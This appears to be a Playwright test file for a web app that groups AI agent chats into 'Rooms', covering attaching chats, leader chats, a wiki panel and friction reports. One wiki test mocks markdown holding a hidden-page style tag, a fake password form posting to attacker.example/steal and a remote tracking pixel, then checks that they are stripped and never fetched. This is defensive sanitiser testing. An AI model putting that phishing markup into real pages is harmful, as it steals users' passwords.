import { test, expect } from '@playwright/test'

const BASE = process.env.FEATHER_URL || 'http://localhost:4870'

test('attaches and detaches an existing chat without duplicate Room rows', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 })
  let attached = false
  const seeded = {
    id: 'seeded-room-chat', title: 'Seeded marriage chat', updatedAt: '2026-08-22T12:00:00Z',
    isActive: false, agent: 'claude', roomAssigned: true,
  }
  const candidate = {
    id: 'ungrouped-chat', title: 'Chat to attach', updatedAt: '2026-08-22T11:00:00Z',
    isActive: false, agent: 'codex', projectId: '-srv-zak-unrelated',
  }

  await page.route('**/api/rooms', async (route) => {
    await route.fulfill({ json: { rooms: [{
      name: 'marriage', cwd: '/srv/zak/home/rooms/marriage', active: false,
      latest: null, updatedAt: seeded.updatedAt,
      pulse: { enabled: true, status: 'waiting', lastRunAt: null, nextRunAt: '2026-08-22T12:15:00Z', sessionId: null },
      sessions: attached ? [seeded, { ...candidate, roomAssigned: true }] : [seeded],
    }] } })
  })
  await page.route('**/api/sessions?limit=300', async (route) => {
    await route.fulfill({ json: { sessions: [candidate] } })
  })
  await page.route('**/api/sessions?q=*', async (route) => {
    await route.fulfill({ json: { sessions: [candidate] } })
  })
  await page.route('**/api/rooms/marriage/assign', async (route) => {
    const body = JSON.parse(route.request().postData() || '{}')
    if (body.sessionId === candidate.id) attached = !body.remove
    await route.fulfill({ json: { ok: true, assignments: attached ? { [candidate.id]: 'marriage' } : {} } })
  })
  await page.route('**/api/rooms/marriage/pulse', async (route) => {
    await route.fulfill({ json: { ok: true, pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null } } })
  })

  await page.goto(BASE)
  await expect(page.getByText('#marriage')).toBeVisible()
  await expect(page.getByTestId('pulse-marriage')).toHaveText('Keep working')
  await page.getByTestId('pulse-marriage').click()
  await expect(page.getByTestId('pulse-marriage')).toHaveText('Paused')
  await expect(page.getByText('Paused', { exact: true })).toHaveCount(1)
  await page.locator('button:has-text("›")').click()
  await page.getByTestId('attach-existing-marriage').click()
  await expect(page.getByTestId('attach-picker-marriage')).toBeVisible()
  await page.getByTestId(`attach-${candidate.id}`).click()

  await expect(page.getByTestId(`detach-${candidate.id}`)).toHaveCount(0)
  await expect(page.getByText(candidate.title, { exact: true })).toHaveCount(1)
  await page.getByTestId('manage-chats-marriage').click()
  await expect(page.getByTestId(`detach-${candidate.id}`)).toBeVisible()
  await page.screenshot({ path: 'test-results/rooms-u3-attach-mobile.png', fullPage: true })
  await page.getByTestId(`detach-${candidate.id}`).click()
  await expect(page.getByText(candidate.title, { exact: true })).toHaveCount(0)

  await page.getByTestId('attach-search-marriage').fill('Chat to attach')
  await page.getByTestId('attach-search-marriage').press('Enter')
  await expect(page.getByTestId(`attach-${candidate.id}`)).toBeVisible()
  await page.getByTestId(`attach-${candidate.id}`).click()
  await expect(page.getByText(candidate.title, { exact: true })).toHaveCount(1)
})

test('Room card always opens its durable Leader chat', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 })
  const pulse = {
    id: 'pulse-chat', title: 'Human continued this pulse chat', updatedAt: '2026-08-24T01:00:00Z',
    isActive: true, agent: 'omp', roomAssigned: true,
  }
  const leader = {
    id: 'leader-human-chat', title: '#feather Leader', updatedAt: '2026-08-23T23:00:00Z',
    isActive: false, agent: 'omp', roomAssigned: true,
  }
  const newer = {
    id: 'newer-human-chat', title: 'A newer human chat', updatedAt: '2026-08-24T00:30:00Z',
    isActive: false, agent: 'claude', roomAssigned: true,
  }
  const archived = Array.from({ length: 4 }, (_, index) => ({
    id: `archived-${index}`, title: `Archived chat ${index}`, updatedAt: `2026-08-22T0${index}:00:00Z`,
    isActive: false, agent: 'codex', roomAssigned: true,
  }))
  const leaderSessionId = leader.id
  const pulseSessionId = pulse.id
  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{
    name: 'feather', cwd: '/home/user/rooms/feather', active: true,
    latest: { role: 'assistant', text: 'Leader finished work.' }, updatedAt: leader.updatedAt,
    updates: { count: 0, latestAt: null, latest: null },
    friction: { count: 0, latestAt: null, latest: null },
    pulse: { enabled: true, status: pulseSessionId ? 'working' : 'waiting', lastRunAt: pulse.updatedAt, nextRunAt: null, sessionId: pulseSessionId },
    leaderSessionId,
    sessions: [pulse, newer, leader, ...archived],
  }] } }))

  await page.goto(BASE)
  await expect(page.getByText('#feather', { exact: true })).toBeVisible()
  await page.getByTestId('room-card-feather').locator('button:has-text("›")').click()
  await expect(page.getByTestId(`leader-${leader.id}`)).toBeVisible()
  await expect(page.getByTestId(`session-${archived.at(-1).id}`)).toHaveCount(0)
  await page.getByText('#feather', { exact: true }).click()
  await expect(page).toHaveURL(/#leader-human-chat$/)

  await page.goto(BASE)
  await page.getByTestId('room-card-feather').locator('button:has-text("›")').click()
  await page.getByTestId('manage-chats-feather').click()
  await expect(page.getByTestId(`session-${archived.at(-1).id}`)).toBeVisible()
  await expect(page.getByTestId(`leader-${leader.id}`)).toBeVisible()
  await expect(page.getByTestId(`detach-${leader.id}`)).toHaveCount(0)
  await expect(page.locator('[data-testid^="make-leader-"]')).toHaveCount(0)
})

test('Wiki presents caretaker synthesis and never exposes the raw Updates feed', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 })
  let updateRequests = 0
  let remoteMediaRequests = 0
  await page.route('https://attacker.example/**', async (route) => {
    remoteMediaRequests++
    await route.abort()
  })
  await page.route('**/api/rooms', async (route) => {
    await route.fulfill({ json: { rooms: [{
      name: 'meta', cwd: '/srv/rooms/meta', active: false, latest: null, updatedAt: '2026-08-22T13:30:00Z',
      updates: { count: 2, latestAt: '2026-08-22T13:30:00Z', latest: 'RAW COPIED TWEET' },
      friction: { count: 0, latestAt: null, latest: null },
      pulse: { enabled: true, status: 'waiting', lastRunAt: null, nextRunAt: '2026-08-22T13:45:00Z', sessionId: null },
      sessions: [],
    }] } })
  })
  await page.route('**/api/rooms/meta/wiki', async (route) => {
    await route.fulfill({ json: { pages: [{ name: 'Home', size: 80, updatedAt: '2026-08-22T14:00:00Z' }] } })
  })
  await page.route('**/api/rooms/meta/wiki/page**', async (route) => {
    await route.fulfill({ json: {
      name: 'Home',
      content: '# Meta knowledge\n\nThe caretaker synthesized the evidence into this durable conclusion.\n\n<style>body{display:none}</style><form action=\"https://attacker.example/steal\"><input name=\"password\"></form>![pixel](https://attacker.example/pixel)',
      updatedAt: '2026-08-22T14:00:00Z',
    } })
  })
  await page.route('**/api/rooms/meta/updates', async (route) => {
    updateRequests++
    await route.fulfill({ json: { updates: [{ id: 'u1', ts: null, text: 'RAW COPIED TWEET' }] } })
  })

  await page.goto(BASE)
  const wiki = page.getByTestId('wiki-meta')
  await expect(wiki).toBeVisible()
  await expect(wiki).not.toContainText('new')
  await wiki.click()
  const panel = page.getByTestId('wiki-panel-meta')
  await expect(panel).toContainText('The caretaker synthesized the evidence')
  await expect(panel).not.toContainText('RAW COPIED TWEET')
  await expect(panel.getByRole('button', { name: 'Updates', exact: true })).toHaveCount(0)
  expect(updateRequests).toBe(0)
  await expect(panel.locator('style, form, input, img')).toHaveCount(0)
  expect(remoteMediaRequests).toBe(0)
})

test('shows friction only on the Room that reported it', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 })
  const complaints = [{
    id: 'f1', timestamp: '2026-08-23T12:00:00Z', source: 'health',
    summary: 'Calendar login loop', evidence: 'OAuth callback returned 401',
  }]
  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{
    name: 'health', cwd: '/srv/rooms/health', active: false, latest: null,
    updatedAt: complaints[0].timestamp,
    updates: { count: 0, latestAt: null, latest: null },
    friction: { count: 1, latestAt: complaints[0].timestamp, latest: complaints[0].summary },
    pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null },
    sessions: [],
  }, {
    name: 'family', cwd: '/srv/rooms/family', active: false, latest: null, updatedAt: null,
    updates: { count: 0, latestAt: null, latest: null },
    friction: { count: 0, latestAt: null, latest: null },
    pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null },
    sessions: [],
  }] } }))
  await page.route('**/api/rooms/health/friction', route => route.fulfill({ json: { complaints, count: 1 } }))

  await page.goto(BASE)
  await expect(page.getByTestId('friction-health')).toContainText('1')
  await expect(page.getByTestId('friction-family')).toContainText('0')
  await page.getByTestId('friction-health').click()
  const panel = page.getByTestId('friction-panel-health')
  await expect(panel).toBeVisible()
  await expect(panel).toContainText('Calendar login loop')
  await expect(panel).toContainText('OAuth callback returned 401')
  await expect(page.getByTestId('friction-panel-family')).toHaveCount(0)
})
